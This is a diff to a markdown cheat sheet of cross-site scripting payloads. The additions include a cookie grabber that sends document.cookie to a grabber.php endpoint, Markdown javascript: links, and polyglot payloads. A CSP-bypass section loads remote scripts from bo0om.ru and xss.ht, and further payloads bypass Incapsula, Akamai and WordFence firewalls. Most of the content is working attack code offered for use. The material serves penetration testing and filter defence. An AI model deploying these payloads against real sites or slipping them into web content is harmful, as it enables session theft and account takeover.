@@ -6,9 +6,10 @@ Cross-site scripting (XSS) is a type of computer security vulnerability typicall
 - [Identify an XSS endpoint](#identify-an-xss-endpoint)
 - [XSS in HTML/Applications](#xss-in-htmlapplications)
 - [XSS in wrappers javascript and data URI](#xss-in-wrappers-javascript-and-data-uri)
-- [XSS in files](#xss-in-files)
+- [XSS in files (XML/SVG/CSS/Flash/Markdown)](#xss-in-files)
 - [Polyglot XSS](#polyglot-xss)
 - [Filter Bypass and Exotic payloads](#filter-bypass-and-exotic-payloads)
+- [CSP Bypas](#csp-bypass)
 - [Common WAF Bypas](#common-waf-bypass)
 
 ## Exploit code or POC
@@ -18,7 +19,9 @@ Cookie grabber for XSS
 ```php
 <?php
 // How to use it
-# <script>document.location='http://localhost/XSS/grabber.php?c=' + document.cookie</script>
+<script>document.location='http://localhost/XSS/grabber.php?c='+document.cookie</script>
+or
+<script>new Image().src="http://localhost/cookie.php?c="+document.cookie;</script>
 
 // Write the cookie in a file
 $cookie = $_GET['c'];
@@ -94,6 +97,11 @@ XSS for HTML5
 <details/open/ontoggle="alert`1`">
 <audio src onloadstart=alert(1)>
 <marquee onstart=alert(1)>
+<meter value=2 min=0 max=10 onmouseover=alert(1)>2 out of 10</meter>
+
+<body ontouchstart=alert(1)> // Triggers when a finger touch the screen
+<body ontouchend=alert(1)>   // Triggers when a finger is removed from touch screen
+<body ontouchmove=alert(1)>  // When a finger is dragged across the screen.
 ```
 
 XSS using script tag (external payload)
@@ -232,6 +240,15 @@ XSS in SVG (short)
 <svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
 ```
 
+XSS in Markdown
+
+```csharp
+[a](javascript:prompt(document.cookie))
+[a](j a v a s c r i p t:prompt(document.cookie))
+[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
+[a](javascript:window.onerror=alert;throw%201)
+```
+
 XSS in SWF flash application
 
 ```powershell
@@ -335,6 +352,22 @@ Polyglot XSS - [@s0md3v](https://twitter.com/s0md3v/status/966175714302144514)
 
 ```javascript
 <svg%0Ao%00nload=%09((pro\u006dpt))()//
+```
+
+Polyglot XSS - from [@filedescriptor's Polyglot Challenge](http://polyglot.innerht.ml)
+
+```javascript
+# by crlf
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+
+# by europa
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=alert()//>
+
+# by EdOverflow
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
+
+# by h1/ragnar
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template>&lt;svg/onload='/*--><html */ onmouseover=alert()//'>`
 ```
 
 ## Filter Bypass and exotic payloads
@@ -662,12 +695,6 @@ Little Endian : 0xFF 0xFE 0x00 0x00
 XSS : %00%00%fe%ff%00%00%00%3C%00%00%00s%00%00%00v%00%00%00g%00%00%00/%00%00%00o%00%00%00n%00%00%00l%00%00%00o%00%00%00a%00%00%00d%00%00%00=%00%00%00a%00%00%00l%00%00%00e%00%00%00r%00%00%00t%00%00%00(%00%00%00)%00%00%00%3E
 ```
 
-Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
-//google.com/complete/search?client=chrome&jsonp=alert(1);
-
-```js
-<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
-```
 
 Bypass using weird encoding or native interpretation to hide the payload (alert())
 
@@ -696,6 +723,42 @@ Exotic payloads
 <iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
 ```
 
+## CSP Bypass
+
+Check the CSP on [https://csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) and the post : [How to use Google’s CSP Evaluator to bypass CSP](https://blog.thomasorlita.cz/vulns/google-csp-evaluator/)
+
+### Bypass CSP using JSONP from Google (Trick by [@apfeifer27](https://twitter.com/apfeifer27))
+
+//google.com/complete/search?client=chrome&jsonp=alert(1);
+
+```js
+<script/src=//google.com/complete/search?client=chrome%26jsonp=alert(1);>"
+```
+
+### Bypass CSP by [lab.wallarm.com](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa)
+
+Works for CSP like `Content-Security-Policy: default-src 'self' 'unsafe-inline';`, [POC here](http://hsts.pro/csp.php?xss=f=document.createElement%28"iframe"%29;f.id="pwn";f.src="/robots.txt";f.onload=%28%29=>%7Bx=document.createElement%28%27script%27%29;x.src=%27//bo0om.ru/csp.js%27;pwn.contentWindow.document.body.appendChild%28x%29%7D;document.body.appendChild%28f%29;)
+
+```js
+script=document.createElement('script');
+script.src='//bo0om.ru/csp.js';
+window.frames[0].document.head.appendChild(script);
+```
+
+### Bypass CSP by [Rhynorater](https://gist.github.com/Rhynorater/311cf3981fda8303d65c27316e69209f)
+
+```js
+d=document;f=d.createElement("iframe");f.src=d.querySelector('link[href*=".css"]').href;d.body.append(f);s=d.createElement("script");s.src="https://swk.xss.ht";setTimeout(function(){f.contentWindow.document.head.append(s);},1000)
+```
+
+### Bypass CSP by [@akita_zen](https://twitter.com/akita_zen)
+
+Works for CSP like `script-src self`
+
+```js
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+```
+
 ## Common WAF Bypass
 
 ### Chrome Auditor - 9th august
@@ -706,7 +769,7 @@ Exotic payloads
 
 Live example by @brutelogic - [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?c1=</script><svg><script>alert(1)-%26apos%3B)
 
-### Incapsula WAF Bypass - 8th march
+### Incapsula WAF Bypass by [@Alra3ees](https://twitter.com/Alra3ees/status/971847839931338752)- 8th march
 
 ```javascript
 anythinglr00</script><script>alert(document.domain)</script>uxldz
@@ -714,10 +777,28 @@ anythinglr00</script><script>alert(document.domain)</script>uxldz
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 ```
 
-### Akamai WAF bypass by @zseano - 18th june
+### Incapsula WAF Bypass by [@c0d3G33k](https://twitter.com/c0d3G33k) - 11th september
+
+```javascript
+<object data='data:text/html;;;;;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>
+```
+
+### Akamai WAF Bypass by [@zseano](https://twitter.com/zseano) - 18th june
 
 ```javascript
 ?"></script><base%20c%3D=href%3Dhttps:\mysite>
+```
+
+### Akamai WAF Bypass by [@s0md3v](https://twitter.com/s0md3v/status/1056447131362324480) - 28th october
+
+```html
+<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
+```
+
+### WordFence WAF Bypass by [@brutelogic](https://twitter.com/brutelogic) - 12th september
+
+```javascript
+<a href=javas&#99;ript:alert(1)>
 ```
 
 ## More fun
